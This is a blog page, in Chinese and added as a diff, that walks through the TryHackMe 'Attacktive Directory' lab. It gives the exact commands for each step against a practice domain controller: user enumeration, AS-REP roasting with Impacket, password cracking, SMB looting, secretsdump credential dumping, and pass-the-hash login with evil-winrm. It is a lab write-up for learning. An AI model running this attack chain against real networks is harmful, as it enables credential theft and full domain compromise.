@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before allTryHackMe 上的連結：https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;attacktivedirectoryAD是什麼?Wikipedia 上的介紹   在台灣好厲駭的課有聽過一次Mars大大的AD課程，但因為真的第一次接觸加上東西爆炸多，其實也沒真的學進去多少(頂多觀念)，剛好在TryHackMe上看到一堆AD靶機，就來打打吧~   這台機器的在一個AD網路環境">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attacktive Directory on Tryhackme">
+<meta property="og:url" content="http://wha13.github.io/2024/03/03/Attack-Directory/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before allTryHackMe 上的連結：https:&#x2F;&#x2F;tryhackme.com&#x2F;room&#x2F;attacktivedirectoryAD是什麼?Wikipedia 上的介紹   在台灣好厲駭的課有聽過一次Mars大大的AD課程，但因為真的第一次接觸加上東西爆炸多，其實也沒真的學進去多少(頂多觀念)，剛好在TryHackMe上看到一堆AD靶機，就來打打吧~   這台機器的在一個AD網路環境">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJCVc-zpT.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkwr5WzaT.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyBxo-Ga6.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Skyfhbz6p.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkztnZGa6.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1cCh-z6a.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJZXTWfT6.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkG70Zfaa.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkREJMzp6.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hyq1xMfpp.png">
+<meta property="article:published_time" content="2024-03-04T02:10:04.000Z">
+<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="Pentesting">
+<meta property="article:tag" content="AD">
+<meta property="article:tag" content="Active Directory">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="TryHackMe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/rJCVc-zpT.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Attacktive Directory on Tryhackme</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/03/04/weasel/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/03/03/blueprint/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/03/03/Attack-Directory/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/03/03/Attack-Directory/&text=Attacktive Directory on Tryhackme"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/03/03/Attack-Directory/&title=Attacktive Directory on Tryhackme"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/03/03/Attack-Directory/&is_video=false&description=Attacktive Directory on Tryhackme"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Attacktive Directory on Tryhackme&body=Check out this article: http://wha13.github.io/2024/03/03/Attack-Directory/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/03/03/Attack-Directory/&title=Attacktive Directory on Tryhackme"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/03/03/Attack-Directory/&title=Attacktive Directory on Tryhackme"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/03/03/Attack-Directory/&title=Attacktive Directory on Tryhackme"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/03/03/Attack-Directory/&title=Attacktive Directory on Tryhackme"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/03/03/Attack-Directory/&name=Attacktive Directory on Tryhackme&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/03/03/Attack-Directory/&t=Attacktive Directory on Tryhackme"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RECON"><span class="toc-number">2.1.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap"><span class="toc-number">2.1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#enum4linux"><span class="toc-number">2.1.2.</span> <span class="toc-text">enum4linux</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kerbrute"><span class="toc-number">2.1.3.</span> <span class="toc-text">kerbrute</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TGT-Attack-with-svc-admin"><span class="toc-number">2.2.1.</span> <span class="toc-text">TGT Attack with svc-admin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB-to-get-backup%E2%80%99s-password"><span class="toc-number">2.2.2.</span> <span class="toc-text">SMB to get backup’s password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#backup-to-Administrator"><span class="toc-number">2.2.3.</span> <span class="toc-text">backup to Administrator</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">3.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Attacktive Directory on Tryhackme
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-04T02:10:04.000Z" class="dt-published" itemprop="datePublished">2024-03-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AD/" rel="tag">AD</a>, <a class="p-category" href="/tags/Active-Directory/" rel="tag">Active Directory</a>, <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>, <a class="p-category" href="/tags/TryHackMe/" rel="tag">TryHackMe</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>TryHackMe 上的連結：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/attacktivedirectory">https://tryhackme.com/room/attacktivedirectory</a><br>AD是什麼?<br><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-tw/Active_Directory">Wikipedia 上的介紹</a>  </p>
+<p>在台灣好厲駭的課有聽過一次Mars大大的AD課程，但因為真的第一次接觸加上東西爆炸多，其實也沒真的學進去多少(頂多觀念)，剛好在TryHackMe上看到一堆AD靶機，就來打打吧~  </p>
+<p>這台機器的在一個AD網路環境，它代表的是一台Kerberos DC(Domain Controller)。<br>雖然說這有點事後諸葛，但是本題的攻擊鍊是：  </p>
+<p>:::info<br>字典攻擊找username -&gt; TGT暴破svc-admin的密碼 -&gt; 用 svc-admin 的身分登入 smb 找到使用者 backup 的密碼備份檔 -&gt;用 backup 的身分透過DRSUAPI的方法炸出每個使用者的hash -&gt; 利用 Pass The Hash 攻擊登入 Administrator<br>:::  </p>
+<p>Victim’s IP : 10.10.162.250<br>Victim’s Host : spookysec.local<br>Attacker’s IP : 10.9.195.189  </p>
+<p><strong>註：</strong> 記得去變更<code>/etc/hosts</code>設定檔改Host Name  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p><strong>Command</strong><br><code>nmap -sC -sV -Pn 10.10.162.250</code><br><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.162.143</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 987 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-03 08:36:16Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local</span><br><span class="line">| Not valid before: 2024-03-02T08:23:05</span><br><span class="line">|_Not valid after:  2024-09-01T08:23:05</span><br><span class="line">|_ssl-date: 2024-03-03T08:36:43+00:00; +1s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: THM-AD</span><br><span class="line">|   NetBIOS_Domain_Name: THM-AD</span><br><span class="line">|   NetBIOS_Computer_Name: ATTACKTIVEDIREC</span><br><span class="line">|   DNS_Domain_Name: spookysec.local</span><br><span class="line">|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-03-03T08:36:34+00:00</span><br><span class="line">Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-03-03T08:36:37</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 1s, deviation: 0s, median: 0s</span><br></pre></td></tr></table></figure>
+<p><strong>Analyze</strong><br>有smb service, RDP，整體架構是AD網路，HOST NAME是<code>spookysec.local</code>  </p>
+<h4 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h4><p><strong>Command</strong><br><code>enum4linux -a  spookysec.local</code><br><strong>Result</strong><br><img src="https://hackmd.io/_uploads/rJCVc-zpT.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/rkwr5WzaT.png" alt="image">  </p>
+<p>許多User資料被炸出來<br>獲得NetBios Name是THM-AD(但以後續動作來看沒什麼功能…)  </p>
+<h4 id="kerbrute"><a href="#kerbrute" class="headerlink" title="kerbrute"></a>kerbrute</h4><p>新工具，可以去Github上下載到：<br><a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute/releases">Click Me : https://github.com/ropnop/kerbrute/releases</a>  </p>
+<p>透過題目提供的userlist.txt進行攻擊(也有提供password.txt做後續的hash爆破)<br><strong>command:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum --dc 10.10.184.186 -d spookysec.local usernames.txt</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/HyBxo-Ga6.png" alt="image">  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>首先，安裝Impacket工具包  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/SecureAuthCorp/impacket.git /opt/impacket</span><br><span class="line">pip3 install -r /opt/impacket/requirements.txt</span><br><span class="line"><span class="built_in">cd</span> /opt/impacket/ &amp;&amp; python3 ./setup.py install</span><br></pre></td></tr></table></figure>
+<p>可能會需要掛<code>sudo</code>(後續攻擊行為也有很多需要，就不贅述)  </p>
+<h4 id="TGT-Attack-with-svc-admin"><a href="#TGT-Attack-with-svc-admin" class="headerlink" title="TGT Attack with svc-admin"></a>TGT Attack with svc-admin</h4><p>獲取TGT的原理大致上是在kerberos驗證的時候進行訊息劫持…(?應該啦)<br><strong>注意我這時候在的路徑是<code>/opt/impacket/examples</code></strong><br>利用Impacket的<code>GetNPUsers.py</code>進行攻擊<br><strong>Command</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetNPUsers.py spookysec.local/svc-admin -no-<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/Skyfhbz6p.png" alt="image">  </p>
+<p><strong>password cracking</strong><br>把剛剛的結果丟到<code>pass</code><br><code>john pass --wordlist=passwordlist.txt</code><br><img src="https://hackmd.io/_uploads/SkztnZGa6.png" alt="image">  </p>
+<h4 id="SMB-to-get-backup’s-password"><a href="#SMB-to-get-backup’s-password" class="headerlink" title="SMB to get backup’s password"></a>SMB to get backup’s password</h4><p>這步沒太多東西，就是拿到剛剛svc-hosts的密碼後登入smb service  </p>
+<p><code>smbclient  -U svc-admin //10.10.162.143/backup</code>  </p>
+<p><img src="https://hackmd.io/_uploads/B1cCh-z6a.png" alt="image">  </p>
+<p>密碼get!!  </p>
+<p><img src="https://hackmd.io/_uploads/BJZXTWfT6.png" alt="image">  </p>
+<h4 id="backup-to-Administrator"><a href="#backup-to-Administrator" class="headerlink" title="backup to Administrator"></a>backup to Administrator</h4><p>利用Impackets中的<code>secretsdump.py</code>結合backup權限炸出各個使用者的密碼 hash<br><strong>Command</strong><br><code>sudo python3 secretsdump.py -just-dc backup@spookysec.local</code><br><strong>Result</strong><br><img src="https://hackmd.io/_uploads/SkG70Zfaa.png" alt="image">  </p>
+<p>拿到密碼hash後透過Pass The Hash攻擊登入admin  </p>
+<p><em>What is pass the hash attack?</em><br>看這篇：<a target="_blank" rel="noopener" href="https://wwwstar.medium.com/%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F-pass-the-hash-pth-%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95%E5%8F%8A%E9%98%B2%E7%A6%A6-%E5%81%B5%E6%B8%AC%E6%8E%AA%E6%96%BD-e1d15e807a67">https://wwwstar.medium.com/%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F-pass-the-hash-pth-%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95%E5%8F%8A%E9%98%B2%E7%A6%A6-%E5%81%B5%E6%B8%AC%E6%8E%AA%E6%96%BD-e1d15e807a67</a>  </p>
+<p>利用<code>evil-winrm</code>工具進行Pass The Hash攻擊直接登入<br><strong>Command</strong><br><code>evil-winrm -i 10.10.88.124 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</code>  </p>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/BkREJMzp6.png" alt="image">  </p>
+<p><em>RCE!!!</em><br><strong>如何確認自己在AD裡面的身分：</strong><br><code>Get-ADUser -Identity &quot;Administrator&quot; -Properties *</code>  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>經過這台靶機感覺多會了蠻多技巧，AD還有超級超級多要學，繼續努力w<br>附上打這台機器沒什麼用但還是物盡其用搞得RDP<br><img src="https://hackmd.io/_uploads/Hyq1xMfpp.png" alt="image">  </p>
+<p>駭客ㄉ浪漫啊~<br>晚ㄢ :&gt;  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RECON"><span class="toc-number">2.1.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap"><span class="toc-number">2.1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#enum4linux"><span class="toc-number">2.1.2.</span> <span class="toc-text">enum4linux</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kerbrute"><span class="toc-number">2.1.3.</span> <span class="toc-text">kerbrute</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TGT-Attack-with-svc-admin"><span class="toc-number">2.2.1.</span> <span class="toc-text">TGT Attack with svc-admin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB-to-get-backup%E2%80%99s-password"><span class="toc-number">2.2.2.</span> <span class="toc-text">SMB to get backup’s password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#backup-to-Administrator"><span class="toc-number">2.2.3.</span> <span class="toc-text">backup to Administrator</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">3.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/03/03/Attack-Directory/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/03/03/Attack-Directory/&text=Attacktive Directory on Tryhackme"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/03/03/Attack-Directory/&title=Attacktive Directory on Tryhackme"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/03/03/Attack-Directory/&is_video=false&description=Attacktive Directory on Tryhackme"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Attacktive Directory on Tryhackme&body=Check out this article: http://wha13.github.io/2024/03/03/Attack-Directory/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/03/03/Attack-Directory/&title=Attacktive Directory on Tryhackme"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/03/03/Attack-Directory/&title=Attacktive Directory on Tryhackme"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/03/03/Attack-Directory/&title=Attacktive Directory on Tryhackme"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/03/03/Attack-Directory/&title=Attacktive Directory on Tryhackme"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/03/03/Attack-Directory/&name=Attacktive Directory on Tryhackme&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/03/03/Attack-Directory/&t=Attacktive Directory on Tryhackme"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
